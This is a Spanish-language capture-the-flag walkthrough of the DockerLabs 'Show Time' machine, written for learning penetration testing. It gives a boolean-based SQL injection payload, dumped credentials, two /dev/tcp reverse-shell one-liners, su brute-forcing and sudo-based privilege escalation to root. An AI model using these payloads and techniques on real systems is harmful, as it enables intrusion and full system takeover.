# SHOW TIME - DOCKERLABS

## INFORMACIÓN Y DESPLIEGUE DE LA MÁQUINA

Esta máquina es de [DockerLabs](https://dockerlabs.es)

Para descargarla vas a [DockerLabs](https://dockerlabs.es) y buscas la máquina Show Time. Abres el enlace de mega, descargas el zip, lo descomprimes y ejecutas `bash ./auto_deploy.sh ./showtime.tar`. De esta forma se ejecutará el contendor de docker de la máquina.

### descripción

- Dificultad: fácil
- Sistema Operativo: linux
- Autor: maciiii___

## RECONOCIMIENTO DE RED

### conectividad y SO

Comprobamos nuestra conectividad con la máquina: `ping -c 1 172.17.0.2`
> `-c 1` Solo enviar 1 paquete ICMP

![image](https://github.com/user-attachments/assets/75d6b7e0-7f86-440e-877b-7a8a41733a10)

Vemos que nos llega la respuesta de vuelta de la máquina, con TTL de 64 por lo que su SO es Linux.

### puertos y servicios

Hacemos un escaneo de todo el rango de puertos con nmap: `nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG tcp_ports`.
> `-p-`: todo el rango de puertos

> `--open`: solo reportar los puertos abiertos

> `-sS`: usar el método de escaneo SYN, que es más sigiloso y rápido que el normal. Requiere privilegios a nivel de sistema para enviar raw packets

> `--min-rate 5000` enviar como mínimo 5000 paquetes por segundo

> `-vvv` triple verbose. Nada más descubrir un puerto lo muestra por pantalla, también muestra más información de lo normal sobre el escaneo

> `-n` no hacer resolución DNS

> `-Pn` no hacer host discovery

> `-oG tcp_ports` exportar el output en formato grepeable al archivo `tcp_ports`

#### puertos abiertos

**22 - TCP - SSH**

**80 - TCP - HTTP**

Hacemos un escaneo de servicios y versiones con nmap sobre los puertos abiertos: `nmap -p22,80 -sCV 172.17.0.2 -oN tcp_ports_targeted`.
> `-p22,80` hacer el escaneo sobre el puerto 22 y el 80.

> `-sCV` escanear el servicio y la versión (`sV`) y lanzar los scripts de reconocimiento por defecto (`sC`)

> `-oN tcp_ports_targeted` exportar el output en formato nmap al archivo `tcp_ports_targeted`

## RECONOCIMIENTO WEB

Antes de ir a ver la web desde el navegador, lanzamos desde consola el comando `whatweb http://172.17.0.2`. Vemos que la web es un Apache 2.4.58 y que la distro de la máquina es Ubuntu.

Ahora vemos la raíz de la web desde el navegador, y vemos este contenido:

![image](https://github.com/user-attachments/assets/7dd79aeb-48eb-42b6-8cc4-3669027a8b84)

Vemos un botón de login arriba a la derecha, que nos lleva a /login_page/index.php:

![image](https://github.com/user-attachments/assets/73518c8d-ba63-4244-b660-c09ad6568c84)

## EXPLOTACIÓN WEB

Vemos este panel. Si probamos a meter una comilla, sale un error de MySQL, por lo que es vulnerable a inyección SQL. Podemos comprobar que no es vulnerable a una inyección de tipo union based ya que no muestra los datos de las columnas, pero si que es vulnerable a una inyección boolean based. Podemos ir enviando consultas de verdadero o falso para conseguir bases de datos, tablas, columnas y registros. Por ejemplo, para sacara el primer caracter de la primera base de datos, podríamos hacer una consulta como esta: `admin' or (select substring(schema_name,1,1) from information_schema.schemata limit 0,1)='payload'-- -`, y capturar con burpsuite la petición para enviarla al intruder y poner un payload con muchos caracteres, y fijarnos en la respuesta del servidor para ver cual tiene un contenido diferente al resto, y entonces ese esrá el primer caracter. Siguiendo este concepto podemos programar un script en python que automatice todo el proceso del dump del motor MySQL: [script_SQLi](https://github.com/4bytess/dockerlabs-scripts/tree/main/showtime/SQLi).

Usando el script, conseguimos este dump:

![image](https://github.com/user-attachments/assets/781aef6d-129a-426b-8ea1-13c7ea7679fb)

Tenemos 3 credenciales:

- lucas:123321123321
- santiago:123456123456
- joe:MICLAVEESINHACKEABLE

Podemos probar todas en el panel de login de la página web. Las credenciales de lucas y santiago simplemente nos loguearan y nos dirán que estamos bienvenidos, pero la de joe nos lleva a la ruta /login_page/admin-panel.php, en la que hay un panel en el que podemos ejecutar comandos de python:

![image](https://github.com/user-attachments/assets/2a6ab221-3ef9-492f-a929-7b5f24ce744d)

Podemos escribir el comando `import os; os.system('/bin/bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"')` y ponernos en escucha por el puerto 443 con netcat: `netcat -nlvp 443`, y ganamos una consola como el usuario www-data:

![image](https://github.com/user-attachments/assets/d25bdcba-b747-4d9c-8b7c-233328a81c92)

## ESCALADA DE PRIVILEGIOS

### USUARIO JOE

Podemos probar a hacer `su joe` y poner su contraseña de la base de datos, pero no funciona. Si probamos a buscar archivos SUID no hay ninguno interesante. Tampoco tenemos permisos especiales con sudo. Pero si buscamos en la ruta /tmp hay un archivo oculto llamado .hidden_text.txt. Dentro hay una lista de palabras en mayúsculas. Podemos usar esta lista como diccionario para aplicar fuerza bruta sobre el usuario luciano y joe (sabemos que existen gracias al /etc/passwd) con la herramienta [Sudo_BruteForce](https://github.com/Maalfer/Sudo_BruteForce). Nos la descargamos en nuestra máquina con git y la traemos a la máquina con un servidor simple de python3 (`python3 -m http.server 80`). En la máquina ejecutamos en /tmp este comando `bash Linux-Su-Force.sh joe ./.hidden_text.txt` y `bash Linux-Su-Force.sh luciano ./.hidden_text.txt`. No reporta ninguna contraseña como válida. Podemos probar a pasar las contraseñas a minúscula: `tr "A-Z" "a-z" < ./.hidden_text.txt > lowercase.txt`, y volver a hacer fuerza bruta con el nuevo diccionario: `bash Linux-Su-Force.sh joe ./lowercase.txt` y `bash Linux-Su-Force.sh luciano ./lowercase.txt`. Esta vez reporta una contraseña para el usuario joe: "chittychittybangbang".

Ahora nos pasamos a una conexión SSH con las credenciales joe:chittychittybangbang.

### USUARIO LUCIANO

Siendo el usuario joe, podemos probar a hacer `sudo -l` para listar privilegios especiales en sudo. Vemos esto:

![image](https://github.com/user-attachments/assets/24dbd247-2a74-42ec-9cbe-5a92e89d5132)

Podemos ejecutar como luciano sin proporcionar contraseña el binario /bin/posh. Si probamos a ejecutar /bin/posh vemos que se nos abre una consola. Si probamos a hacer `sudo -u luciano /bin/posh` ganamos una consola como luciano:

![image](https://github.com/user-attachments/assets/a69279d7-1b25-4557-9856-b89774bfa848)

### ROOT

Ahora tenemos que llegar a ser root.

Si hacemos `sudo -l` vemos esto:

![image](https://github.com/user-attachments/assets/ac3b49d0-bc1a-4f69-a10c-5cf9070f1b9e)

Podemos ejecutar como root sin proporcionar contraseña el script /home/luciano/script.sh. Como el script está en nuestro directorio y somos su propietario, podemos simplemente modificarle para que root nos envíe una reverse shell al puerto 500 por ejemplo, y así ganar una consola como root.

En la máquina no hay editores de texto instalados, así que usamos echo: `echo "#!/bin/bash\n\n/bin/bash -i >& /dev/tcp/172.17.0.1/500 0>&1" > /home/luciano/script.sh`, nos ponemos en escucha por el puerto 500 en una consola aparte y ejecutamos el script: `sudo /bin/bash /home/luciano/script.sh`, y ganamos una consola como root:

![image](https://github.com/user-attachments/assets/8b86da5f-1a83-4e3e-9525-56505bd67ae7)
